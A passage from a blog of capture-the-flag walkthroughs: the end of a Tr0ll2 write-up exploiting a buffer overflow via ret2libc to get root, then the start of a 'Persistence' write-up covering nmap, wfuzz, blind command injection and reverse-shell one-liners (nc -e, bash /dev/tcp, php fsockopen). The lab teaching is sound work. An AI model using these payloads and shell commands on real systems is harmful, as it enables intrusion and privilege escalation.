</span><span class='line'>Starting program: /tmp/r00t <span class="s2">&quot;Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq&quot;</span>
</span><span class='line'>
</span><span class='line'>Program received signal SIGSEGV, Segmentation fault.
</span><span class='line'>0x6a413969 in ?? <span class="o">()</span>
</span></code></pre></td></tr></table></div></figure>


<p>So we crashed at <code>0x6a413969</code>. Lets check the offset of this in our buffer.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# /usr/share/metasploit-framework/tools/pattern_offset.rb 6a413969
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Exact match at offset 268
</span></code></pre></td></tr></table></div></figure>


<p>So at byte 268 we start to override EIP cleanly. We can test this to make sure our calculations were correct by replacing that section with B&rsquo;s:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>noob@Tr0ll2:/tmp<span class="nv">$ </span>gdb -q ./r00t
</span><span class='line'>Reading symbols from /tmp/r00t...done.
</span><span class='line'>
</span><span class='line'><span class="o">(</span>gdb<span class="o">)</span> r <span class="k">$(</span>python -c <span class="s1">&#39;print &quot;A&quot; *268 + &quot;BBBB&quot;&#39;</span><span class="k">)</span>
</span><span class='line'>The program being debugged has been started already.
</span><span class='line'>Start it from the beginning? <span class="o">(</span>y or n<span class="o">)</span> y
</span><span class='line'>Starting program: /tmp/r00t <span class="k">$(</span>python -c <span class="s1">&#39;print &quot;A&quot; *268 + &quot;BBBB&quot;&#39;</span><span class="k">)</span>
</span><span class='line'>
</span><span class='line'>Program received signal SIGSEGV, Segmentation fault.
</span><span class='line'>0x42424242 in ?? <span class="o">()</span>
</span><span class='line'>
</span><span class='line'><span class="o">(</span>gdb<span class="o">)</span> x/x <span class="nv">$eip</span>
</span><span class='line'>0x42424242: Cannot access memory at address 0x42424242
</span><span class='line'><span class="o">(</span>gdb<span class="o">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>So with that done, we can deduce that we can cleanly override EIP at offset 268.</p>

<p>The next part we need to get is the location of <code>system()</code> from within libc. We can leak this address quite easily by inspecting the memory from a running application such as <code>r00t</code> linked to it:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>noob@Tr0ll2:/tmp<span class="nv">$ </span>gdb -q ./r00t
</span><span class='line'>Reading symbols from /tmp/r00t...done.
</span><span class='line'>
</span><span class='line'><span class="o">(</span>gdb<span class="o">)</span> b *main   <span class="c"># here we break on the main function</span>
</span><span class='line'>Breakpoint 1 at 0x8048444: file bof.c, line 3.
</span><span class='line'>
</span><span class='line'><span class="o">(</span>gdb<span class="o">)</span> r         <span class="c"># here we run the application....</span>
</span><span class='line'>Starting program: /tmp/r00t
</span><span class='line'>
</span><span class='line'>Breakpoint 1, main <span class="o">(</span><span class="nv">argc</span><span class="o">=</span>1, <span class="nv">argv</span><span class="o">=</span>0xbffffd84<span class="o">)</span> at bof.c:3
</span><span class='line'>3   bof.c: No such file or directory.
</span><span class='line'>
</span><span class='line'><span class="o">(</span>gdb<span class="o">)</span> p system  <span class="c"># and leak the locatin of system() in memory</span>
</span><span class='line'><span class="nv">$1</span> <span class="o">=</span> <span class="o">{</span>&lt;text variable, no debug info&gt;<span class="o">}</span> 0xb7e6b060 &lt;system&gt;
</span></code></pre></td></tr></table></div></figure>


<p>So <code>system()</code> lives at <code>0xb7e6b060</code>. We are going to point EIP here and provide it a argument from a environment variable. I don&rsquo;t really care if the application exits cleanly, however you can easily get that right by leaking the location of <code>exit()</code> too and placing that as the ret address in the exploit. I just like to type JUNK ;)</p>

<p>So far our exploit payload will look something like this:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>A * 268 + system() + JUNK
</span></code></pre></td></tr></table></div></figure>


<p>The last thing we need is a argument for <code>system()</code> on the stack so that it can execute that. One way of achieving this is to provide the memory location of a string such as <code>/bin/sh</code>. We can easily set an environment variable with this string, locate it in memory and use that.</p>

<p>So lets create this string, which we will refer to as the EGG.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>noob@Tr0ll2:/tmp<span class="nv">$ </span><span class="nb">export </span><span class="nv">EGG</span><span class="o">=</span>/bin/sh
</span><span class='line'>noob@Tr0ll2:/tmp<span class="nv">$ </span>env <span class="p">|</span> grep EGG
</span><span class='line'><span class="nv">EGG</span><span class="o">=</span>/bin/sh
</span></code></pre></td></tr></table></div></figure>


<p>Next, we can use a small C program to tell us where this EGG is in memory:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>noob@Tr0ll2:/tmp<span class="nv">$ </span>cat /tmp/findegg.c
</span><span class='line'><span class="c">#include &lt;unistd.h&gt;</span>
</span><span class='line'>
</span><span class='line'>int main<span class="o">(</span>void<span class="o">)</span>
</span><span class='line'><span class="o">{</span>
</span><span class='line'>  <span class="nb">printf</span><span class="o">(</span><span class="s2">&quot;EGG address: 0x%lx\n&quot;</span>, getenv<span class="o">(</span><span class="s2">&quot;EGG&quot;</span><span class="o">)</span>+4<span class="o">)</span><span class="p">;</span>
</span><span class='line'>  <span class="k">return </span>0<span class="p">;</span>
</span><span class='line'><span class="o">}</span>
</span><span class='line'>
</span><span class='line'>noob@Tr0ll2:/tmp<span class="nv">$ </span>gcc /tmp/findegg.c -o /tmp/findegg
</span><span class='line'><span class="o">[</span>...<span class="o">]</span>
</span><span class='line'>
</span><span class='line'>noob@Tr0ll2:/tmp<span class="nv">$ </span>/tmp/findegg
</span><span class='line'>EGG address: 0xbfffff04
</span></code></pre></td></tr></table></div></figure>


<p>So our egg lives at <code>0xbfffff04</code>. This memory address will probably be different for you if you try, but the process to find it remains the same. We also have to keep in mind that the environment will be slightly different when we execute our exploit in and out of <code>gdb</code>.</p>

<p>With everything we need, we can deduce that our exploit payload will end up being something like this:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>A * 268 + system() + JUNK + EGG
</span></code></pre></td></tr></table></div></figure>


<p>Lets get the python version of that written up and sent to our vulnerable binary (addresses are written &lsquo;backwards&rsquo; due to the little endian format of the CPU):</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>noob@Tr0ll2:/tmp<span class="nv">$ </span>./r00t <span class="k">$(</span>python -c <span class="s1">&#39;print &quot;A&quot; *268 + &quot;\x60\xb0\xe6\xb7&quot; + &quot;JUNK&quot; + &quot;\x04\xff\xff\xbf&quot;&#39;</span><span class="k">)</span>
</span><span class='line'>Segmentation fault
</span></code></pre></td></tr></table></div></figure>


<p>Wups, segfault. You will find that this is probably because the location of our EGG in memory did not compensate for the length of the binary name. Our binary is called <code>r00t</code>, which is 4 chars long, so maybe we need to move the location of our EGG up with up to 4 bytes. For demonstration purposes I am going to show all the attempts for each byte:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="c"># so just to recap, we check for the location of the EGG</span>
</span><span class='line'>noob@Tr0ll2:/tmp<span class="nv">$ </span>./findegg
</span><span class='line'>EGG address: 0xbfffff04
</span><span class='line'>
</span><span class='line'><span class="c"># EGG is at 0xbfffff04, so in little endian format we have:</span>
</span><span class='line'>noob@Tr0ll2:/tmp<span class="nv">$ </span>./r00t <span class="k">$(</span>python -c <span class="s1">&#39;print &quot;A&quot; *268 + &quot;\x60\xb0\xe6\xb7&quot; + &quot;JUNK&quot; + &quot;\x04\xff\xff\xbf&quot;&#39;</span><span class="k">)</span>
</span><span class='line'>Segmentation fault
</span><span class='line'>
</span><span class='line'><span class="c"># A segfault, lets move it up 1 byte</span>
</span><span class='line'>noob@Tr0ll2:/tmp<span class="nv">$ </span>./r00t <span class="k">$(</span>python -c <span class="s1">&#39;print &quot;A&quot; *268 + &quot;\x60\xb0\xe6\xb7&quot; + &quot;JUNK&quot; + &quot;\x05\xff\xff\xbf&quot;&#39;</span><span class="k">)</span>
</span><span class='line'>sh: 1: <span class="o">=</span>/bin/sh: not found
</span><span class='line'>Segmentation fault
</span><span class='line'>
</span><span class='line'><span class="c"># another segfault, however we have a little diagnostics message now</span>
</span><span class='line'><span class="c"># showing that we are not far off :)</span>
</span><span class='line'>noob@Tr0ll2:/tmp<span class="nv">$ </span>./r00t <span class="k">$(</span>python -c <span class="s1">&#39;print &quot;A&quot; *268 + &quot;\x60\xb0\xe6\xb7&quot; + &quot;JUNK&quot; + &quot;\x06\xff\xff\xbf&quot;&#39;</span><span class="k">)</span>
</span><span class='line'><span class="err">$</span>
</span></code></pre></td></tr></table></div></figure>


<h2>trollin the rootin</h2>

<p>So <code>0xbfffff06</code> as a EGG location will give us shell in our testing! To finish off then, I have to find the correct <code>r00t</code> binary in all of the <code>door{1,2,3}</code> folders and attempt my exploit there:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door2<span class="nv">$ </span>./r00t <span class="k">$(</span>python -c <span class="s1">&#39;print &quot;A&quot; *268 + &quot;\x60\xb0\xe6\xb7&quot; + &quot;JUNK&quot; + &quot;\x06\xff\xff\xbf&quot;&#39;</span><span class="k">)</span>
</span><span class='line'>sh: 1: in:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games: not found
</span><span class='line'>Segmentation fault
</span></code></pre></td></tr></table></div></figure>


<p>Another segmentation fault! This time we seem to be waaaaaaaay off too. This is because of the <code>PWD</code> changing so drastically. To fix this, we simply rerun our <code>findegg</code> program and compensate for the binary name. When completing this, I had a successful run as follows:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door2<span class="nv">$ </span>./r00t <span class="k">$(</span>python -c <span class="s1">&#39;print &quot;A&quot; *268 + &quot;\x60\xb0\xe6\xb7&quot; + &quot;JUNK&quot; + &quot;\xe2\xfe\xff\xbf&quot;&#39;</span><span class="k">)</span>
</span><span class='line'><span class="c"># id</span>
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>1002<span class="o">(</span>noob<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1002<span class="o">(</span>noob<span class="o">)</span> <span class="nv">euid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>,1002<span class="o">(</span>noob<span class="o">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>This time I had to move the memory location for for my EGG on by quite a few bytes, in fact from <code>0xbffffeda</code> all the way to <code>0xbffffee2</code></p>

<p>As I was now root, I may cat the <code>Proof.txt</code> in <code>/root</code></p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="c"># cat /root/Proof.txt</span>
</span><span class='line'>You win this <span class="nb">time </span>young Jedi...
</span><span class='line'>
</span><span class='line'>a70354f0258dcc00292c72aab3c8b1e4
</span></code></pre></td></tr></table></div></figure>


<p>Thanks <a href="https://twitter.com/Maleus21">@Maleus21</a> for the fun VM and <a href="http://vulnhub.com/">VulnHub</a> for the hosting :)</p>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2014/09/18/from-persistence/">From Persistence, to pain, to PWN</a></h1>
    
    
      <p class="meta">
        








  


<time datetime="2014-09-18T06:58:53+02:00" pubdate data-updated="true">Sep 18<sup>th</sup>, 2014</time>
        
      </p>
    
  </header>


  <div class="entry-content"><h2>persist we must!</h2>

<p>Persistence! A new boot2root hosted <a href="https://twitter.com/vulnhub">@VulnHub</a>, authored by <a href="https://twitter.com/superkojiman">@superkojiman</a> and sagi- definitely got the attention from the community it deserves! Persistence was actually part of a <a href="http://blog.vulnhub.com/2014/09/competition-persistence.html">writeup competition</a> launched on September the 7th, and ran up until October th 5th.</p>

<blockquote><p>Energy and persistence conquer all things.</p><footer><strong>Benjamin Franklin</strong></footer></blockquote>


<p>This is my experience while trying to complete the challenge. Persistence, once again, challenged me to learn about things that would normally have me just go &ldquo;meh, next&rdquo;. As expected, this post is also a very big spoiler if you have not completed it yourself yet, so be warned!</p>

<h2>lets get our hands dirty</h2>

<p>As usual, the goto tool was Kali Linux, and the normal steps of adding the OVA image to Virtualbox, booting, finding the assigned IP and running a Nmap scan against it was used.</p>

<p>My VM got the IP 192.168.56.104, and the first Nmap result was:</p>

<figure class='code'><figcaption><span>First Persistence Nmap</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# nmap 192.168.56.104 --reason -sV -p-
</span><span class='line'>
</span><span class='line'>Starting Nmap 6.46 <span class="o">(</span> http://nmap.org <span class="o">)</span> at 2014-09-18 07:01 SAST
</span><span class='line'>Nmap scan report <span class="k">for </span>192.168.56.104
</span><span class='line'>Host is up, received reset <span class="o">(</span>0.0037s latency<span class="o">)</span>.
</span><span class='line'>Not shown: 65534 filtered ports
</span><span class='line'>Reason: 65534 no-responses
</span><span class='line'>PORT   STATE SERVICE REASON  VERSION
</span><span class='line'>80/tcp open  http    syn-ack nginx 1.4.7
</span><span class='line'>
</span><span class='line'>Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
</span><span class='line'>Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned in 4131.90 seconds
</span></code></pre></td></tr></table></div></figure>


<p>Not exactly much to work with, but its something at least! We know now that according to the web server banners, we are facing nginx. A welcome change to the usual apache stuff we see! A quick and nasty Google for nginx 1.4.7 exploits also did not return with any really interesting results. Not a problem really.</p>

<p>Browsing to the site did not reveal anything interesting. A creepy image of melting clocks (what&hellip;) with the page sources serving it being minimal and uninteresting too. Manually poking about the web paths (for things like robots.txt etc) also did not reveal anything. The first hint however came when I fiddled with the index page location.</p>

<p>By default, most web servers will serve the default index page when no location is specified from the web root. So, I tried <code>index.html</code>, and got the normal landing. When I requested <code>index.php</code> though, things changed drastically:</p>

<figure class='code'><figcaption><span>PHP reveal</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# curl -v 192.168.56.104/index.php
</span><span class='line'>* About to connect<span class="o">()</span> to 192.168.56.104 port 80 <span class="o">(</span><span class="c">#0)</span>
</span><span class='line'>*   Trying 192.168.56.104...
</span><span class='line'>* connected
</span><span class='line'>* Connected to 192.168.56.104 <span class="o">(</span>192.168.56.104<span class="o">)</span> port 80 <span class="o">(</span><span class="c">#0)</span>
</span><span class='line'>&gt; GET /index.php HTTP/1.1
</span><span class='line'>&gt; User-Agent: curl/7.26.0
</span><span class='line'>&gt; Host: 192.168.56.104
</span><span class='line'>&gt; Accept: */*
</span><span class='line'>
</span><span class='line'>* additional stuff not fine transfer.c:1037: 0 0
</span><span class='line'>* HTTP 1.1 or later with persistent connection, pipelining supported
</span><span class='line'>&lt; HTTP/1.1 404 Not Found
</span><span class='line'>&lt; Server: nginx/1.4.7
</span><span class='line'>&lt; Date: Thu, 18 Sep 2014 07:28:18 GMT
</span><span class='line'>&lt; Content-Type: text/html
</span><span class='line'>&lt; Transfer-Encoding: chunked
</span><span class='line'>&lt; Connection: keep-alive
</span><span class='line'>&lt; X-Powered-By: PHP/5.3.3
</span><span class='line'>
</span><span class='line'>No input file specified.
</span><span class='line'>
</span><span class='line'>* Connection <span class="c">#0 to host 192.168.56.104 left intact</span>
</span><span class='line'>* Closing connection <span class="c">#0</span>
</span></code></pre></td></tr></table></div></figure>


<p>As can be seen in the output above, the header <code>X-Powered-By: PHP/5.3.3</code> is now present, and the output <code>No input file specified.</code>. I recognized this as the behavior of Nginx when PHP-FPM is unable to locate the .php file it should be serving.</p>

<h2>finding that (de)bugger</h2>

<p>With this information now gathered, it was time to pull out one of my favorite tools, <code>wfuzz</code>! With <code>wfuzz</code>, the plan now was to attempt and discover a potentially interesting web path, or, because I know the web server has the capability of serving up PHP content, attempt to find arb PHP scripts.</p>

<p>My first attempt to search for web paths failed pretty badly. All of the requests responded with a 404. Luckily I was aware of the PHP capabilities, so I set to find arbritary PHP scripts by appending <em>.php</em> to my <code>FUZZ</code> keyword:</p>

<figure class='code'><figcaption><span>discovering debug.php</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# wfuzz -c -z file,/usr/share/wordlists/wfuzz/general/medium.txt --hc 404 http://192.168.56.104/FUZZ.php
</span><span class='line'>
</span><span class='line'>********************************************************
</span><span class='line'>* Wfuzz  2.0 - The Web Bruteforcer                     *
</span><span class='line'>********************************************************
</span><span class='line'>
</span><span class='line'>Target: http://192.168.56.104/FUZZ.php
</span><span class='line'>Payload <span class="nb">type</span>: file,/usr/share/wordlists/wfuzz/general/medium.txt
</span><span class='line'>
</span><span class='line'>Total requests: <span class="nv">1660</span>
</span><span class='line'><span class="o">==================================================================</span>
</span><span class='line'>ID  Response   Lines      Word         Chars          <span class="nv">Request</span>
</span><span class='line'><span class="o">==================================================================</span>
</span><span class='line'>
</span><span class='line'>00434:  <span class="nv">C</span><span class="o">=</span>200     12 L        28 W      357 Ch    <span class="s2">&quot; - debug&quot;</span>
</span></code></pre></td></tr></table></div></figure>


<p>Yay. <code>wfuzz</code> is stupidly fast and finished the above in like 4 seconds. Browsing to <a href="http://192.168.56.101/debug.php">http://192.168.56.101/debug.php</a> showed us a input field labeled &ldquo;Ping address:&rdquo; and a submit button</p>

<p><img src="https://i.imgur.com/neKe18e.png"></p>

<p>&ldquo;Command injection?&rdquo;, was the first thought here.</p>

<h2>blind command injection</h2>

<p>I started by entering a valid IP address that had <code>tcpdump</code> listening to test if the script is actually running a ping like it says &hellip;</p>

<figure class='code'><figcaption><span>ping test</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# tcpdump icmp
</span><span class='line'>tcpdump: verbose output suppressed, use -v or -vv <span class="k">for </span>full protocol decode
</span><span class='line'>listening on eth0, link-type EN10MB <span class="o">(</span>Ethernet<span class="o">)</span>, capture size 65535 bytes
</span><span class='line'>07:46:15.503023 IP 192.168.56.104 &gt; 192.168.56.102: ICMP <span class="nb">echo </span>request, id 64004, seq 1, length 64
</span><span class='line'>07:46:15.503040 IP 192.168.56.102 &gt; 192.168.56.104: ICMP <span class="nb">echo </span>reply, id 64004, seq 1, length 64
</span><span class='line'>07:46:16.503729 IP 192.168.56.104 &gt; 192.168.56.102: ICMP <span class="nb">echo </span>request, id 64004, seq 2, length 64
</span><span class='line'>07:46:16.503768 IP 192.168.56.102 &gt; 192.168.56.104: ICMP <span class="nb">echo </span>reply, id 64004, seq 2, length 64
</span><span class='line'>07:46:17.503180 IP 192.168.56.104 &gt; 192.168.56.102: ICMP <span class="nb">echo </span>request, id 64004, seq 3, length 64
</span><span class='line'>07:46:17.503260 IP 192.168.56.102 &gt; 192.168.56.104: ICMP <span class="nb">echo </span>reply, id 64004, seq 3, length 64
</span><span class='line'>07:46:18.502811 IP 192.168.56.104 &gt; 192.168.56.102: ICMP <span class="nb">echo </span>request, id 64004, seq 4, length 64
</span><span class='line'>07:46:18.502842 IP 192.168.56.102 &gt; 192.168.56.104: ICMP <span class="nb">echo </span>reply, id 64004, seq 4, length 64
</span></code></pre></td></tr></table></div></figure>


<p>&hellip; which it was. What is important to note here is that we have 4 echo requests.</p>

<p>I then proceeded to modify the input attempting to execute other commands too. None of my attempts returned any output to the browser, however, sending the field <code>;exit 0;</code> caused the HTTP request to complete almost instantly while no ping requests were observed on the <code>tcpdump</code>. This had me certain that this field was vulnerable to a command injection vulnerability.</p>

<p>This is all good, but not getting any output makes it really had to work with this. So, the next steps were to try and get a reverse/bind shell out of this command injection vulnerability.</p>

<p>I tried the usual culprits: <code>nc &lt;ip&gt;  &lt;port&gt; -e /bin/bash</code>; <code>bash -i &gt;&amp; /dev/tcp/&lt;ip&gt;/&lt;port&gt; 0&gt;&amp;1</code>; <code>php -r '$sock=fsockopen("&lt;ip&gt;",&lt;port&gt;);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</code>. None of them worked. Eventually I started to realize that I may have a much bigger problem here. What if none of these programs (nc/bash/php) are either not executable by me or simply not in my PATH? What if there was a egress packet filter configured?</p>

<h2>blind command injection &ndash; file enumeration</h2>

<p>Ok, so I took one step back and had to rethink my strategy. I have blind command execution, but how am I going to find out what else is going on on the filesystem? Up to now I have simply assumed too much.</p>

<p>I thought I should try and see if I can confirm the existence of files. To do this, I used a simple bash <code>if [ -f /file ]</code> statement, with a single ping for success, and 2 pings for a failure. The string for the <code>debug.php</code> input field looked something like this:</p>

<figure class='code'><figcaption><span>File existence check payload</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="p">;</span><span class="k">if</span> <span class="o">[</span> -f /bin/sh <span class="o">]</span> <span class="p">;</span> <span class="k">then </span>ping 192.168.56.102 -c 1 <span class="p">;</span> <span class="k">else </span>ping 192.168.56.102 -c 2 <span class="p">;</span> <span class="k">fi</span>
</span></code></pre></td></tr></table></div></figure>


<p>Submitting the above input presented me with a single ping, confirming that <code>/bin/sh</code> exists.</p>

<figure class='code'><figcaption><span>File existence response</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# tcpdump icmp
</span><span class='line'>tcpdump: verbose output suppressed, use -v or -vv <span class="k">for </span>full protocol decode
</span><span class='line'>listening on eth0, link-type EN10MB <span class="o">(</span>Ethernet<span class="o">)</span>, capture size 65535 bytes
</span><span class='line'>08:15:53.557994 IP 192.168.56.104 &gt; 192.168.56.102: ICMP <span class="nb">echo </span>request, id 63493, seq 1, length 64
</span><span class='line'>08:15:53.558011 IP 192.168.56.102 &gt; 192.168.56.104: ICMP <span class="nb">echo </span>reply, id 63493, seq 1, length 64
</span></code></pre></td></tr></table></div></figure>


<p>Checking for something like <code>/bin/sh2</code> responded with 2 pings, as expected. Awesome. I can now enumerate the existence of files. The concept itself is probably pretty useless, however, if I can confirm the existence of something useful, such as <code>/bin/nc</code>, I may end up with greater success of a shell!</p>

<p>I continued to test numerous files on numerous locations on disk. I noticed a few files that would generally be available on most Linux systems were not available according to my checker which was really odd. It actually had me doubt the check too. Nonetheless,  <code>/usr/bin/python</code> appeared to be available! I really like python so this had me really happy.</p>

<h2>blind command injection &ndash; port scanner</h2>

<p>I tested a few commands with <code>python -c</code>, such as sleep etc just to confirm that it is working. I then proceeded to try and get a reverse shell going using it.</p>

<p>No. Luck.</p>

<p>I no longer doubted the fact that I had a working interpreter, however, the question about a egress firewall still remains unanswered. To test this, I decided to code a small, cheap-and-nasty port &lsquo;prober&rsquo; so that I can try and determine which port is open outgoing. The idea was to watch my <code>tcpdump</code> for any tcp traffic comming from this host:</p>

<figure class='code'><figcaption><span>probe.py</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">import</span> <span class="nn">socket</span>
